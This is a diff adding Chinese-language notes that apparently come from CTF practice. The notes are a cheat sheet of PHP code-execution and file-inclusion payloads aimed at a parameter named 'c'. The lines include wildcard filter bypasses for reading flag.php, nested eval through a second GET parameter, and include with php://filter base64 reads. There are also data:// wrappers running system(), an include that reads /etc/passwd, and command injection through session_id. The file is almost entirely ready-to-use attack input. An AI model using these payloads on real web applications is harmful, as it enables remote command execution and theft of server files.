@@ -1,0 +1,35 @@
+system("tac fl*g.php");      倒序tac
+echo `nl fl''ag.php`;
+
+echo `cat fl*g.ph*`;
+
+可以尝试通过嵌套eval函数来获取另一个参数的的方法来绕过，因为这里只判断了c这个参数，并不会判断其他参数的传入
+c=eval($_GET[a]);&a=system('cat flag.php');
+这里注意后面是a的参数，而不是c的参数，这个payload共传递了两个参数，第一个为嵌套eval第二个为向嵌套的eval传入参数
+
+phpinfo(); 与 phpinfo()>  php的最后一行可以不用分号，相当于闭合
+
+c=system("cp fla?.php 1.txt");    再访问XXXX/1.txt
+?和*是   占位符  ?是占一个
+
+c=`cp fla?.??? 1.txt`;          再访问XXXX/1.txt
+
+c=include%0a$_GET[a]?>&a=/etc/passwd   %0a是换行符，这里去掉也没关系
+c=include$_GET["url"]?>&url=php://filter/read=convert.base64-encode/resource=flag.php
+使用嵌套传参，文件包含，伪协议
+
+c=require$_GET[url]?>&url=php://filter/read=convert.base64-encode/resource=flag.php
+
+c=data://text/plain,<?=system('tac fla*');?>
+c=data://text/plain,<?php system("tac fla*");?>
+c=data://text/plain,<?php system("tac fla?.php");?>
+c=data://text/plain,<?php system("mv fla?.php 1.txt");?>
+
+c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
+
+c=session_start();system(session_id());
+passid=ls
+
+
+
+
